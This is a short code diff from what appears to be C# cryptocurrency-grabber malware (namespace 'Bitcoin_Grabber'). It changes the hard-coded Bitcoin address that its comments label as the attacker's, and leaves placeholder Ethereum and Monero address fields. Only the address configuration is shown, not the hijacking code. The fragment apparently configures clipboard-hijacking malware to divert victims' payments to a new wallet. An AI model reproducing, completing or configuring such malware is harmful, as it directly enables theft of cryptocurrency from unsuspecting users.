@@ -29,7 +29,7 @@ namespace Bitcoin_Grabber
 
     internal static class Addresses
     {
-        public readonly static string btc = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"; //attacker's btc address
+        public readonly static string btc = "1C8KTmEWF4vo2pjTqYXLJMDCFtEqoDBpdj"; //attacker's btc address
         public readonly static string ethereum = "Ethereum"; //attacker's eth address
         public readonly static string xmr = "XMR"; //attacker's xmr address
     }
